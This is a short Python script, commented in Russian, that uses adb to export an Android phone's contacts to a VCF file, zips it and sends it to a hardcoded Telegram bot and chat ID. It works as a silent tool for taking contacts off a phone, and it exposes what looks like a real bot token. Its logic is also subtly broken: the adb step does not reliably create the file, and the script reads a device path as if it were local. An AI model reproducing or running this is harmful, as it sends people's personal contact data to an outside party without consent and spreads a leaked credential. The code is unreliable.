import os
import subprocess
import zipfile
from datetime import datetime
import telegram

# Укажите токен вашего бота и ID чата для отправки
TELEGRAM_TOKEN = '7767547426:AAHkRTSnr8nV6lxx_rWNa1pfB_IVyNxqx3Q'
CHAT_ID = '652950846'

# Функция для экспорта контактов
def export_contacts():
    # Путь для сохранения VCF файла
    vcf_file_path = "/sdcard/contacts.vcf"
    
    # Команда для экспорта контактов в VCF файл
    export_command = f"adb shell am start -a android.intent.action.MAIN -n com.android.contacts/.ContactsExportActivity"
    
    # Запускаем команду
    subprocess.run(export_command, shell=True)

    # Ждем, пока файл будет создан (можно добавить задержку)
    print("Экспорт контактов завершен.")
    return vcf_file_path

# Функция для архивации файла
def archive_contacts(vcf_file_path):
    zip_file_path = f"contacts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"

    with zipfile.ZipFile(zip_file_path, 'w') as zipf:
        zipf.write(vcf_file_path, os.path.basename(vcf_file_path))
    
    print(f"Контакты заархивированы в {zip_file_path}.")
    return zip_file_path

# Функция для отправки файла в Telegram
def send_file(zip_file_path):
    bot = telegram.Bot(token=TELEGRAM_TOKEN)
    
    with open(zip_file_path, 'rb') as file:
        bot.send_document(chat_id=CHAT_ID, document=file)
    
    print(f"Файл {zip_file_path} отправлен в Telegram.")

# Основная функция
def main():
    vcf_file_path = export_contacts()
    
    # Добавьте задержку, если необходимо, чтобы убедиться, что файл был создан
    # time.sleep(5)  # Задержка в 5 секунд (при необходимости)

    zip_file_path = archive_contacts(vcf_file_path)
    send_file(zip_file_path)

if __name__ == "__main__":
    main()